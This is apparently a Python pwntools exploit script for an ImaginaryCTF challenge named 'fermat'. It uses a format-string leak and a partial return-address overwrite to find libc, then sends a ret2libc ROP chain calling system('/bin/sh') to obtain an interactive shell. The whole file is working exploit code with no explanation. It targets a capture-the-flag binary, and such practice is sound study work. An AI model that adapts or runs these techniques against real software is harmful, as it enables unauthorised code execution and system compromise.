#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("./vuln_patched", checksec=True)
libc = elf.libc
context.log_level = "debug"
#context.log_level = "critical"  # quiet mode

gs = """
b *main+171
continue
"""

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("fermat.chal.imaginaryctf.org", 1337) 
    else:
        return process(elf.path)


io = start()



def first_stage():
    padd = 0x108
    fmt_str = b"%3$p.%p.%p.%p.%p.%p"
    payload = fmt_str + b"A" * (padd - len(fmt_str)) + b"\x89"  # LSB overwrite main return address
    io.send(payload)
    io.recvuntil(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
    #leak = io.recv(48+9)
    #leak = leak.split(b".")
    leak = io.recv(8)
    leak = (u64(leak.ljust(8, b"\x00")))
    return leak

def second_stage():
    padd = 0x108
    pop_rdi = p64(libc.address+0x2a3e5)
    binsh = p64(next(libc.search(b"/bin/sh")))
    system = p64(libc.sym.system)
    ret = p64(libc.address+0x29cd6)
    payload = (b"B"*padd) + ret +pop_rdi + binsh + system
    io.send(payload)


if __name__ == "__main__":
    leak = first_stage()
    print(leak)
    libc.address = leak - 0x29d89
    print(f"libc @ {libc.address:#0x}")
    second_stage()
    io.interactive()
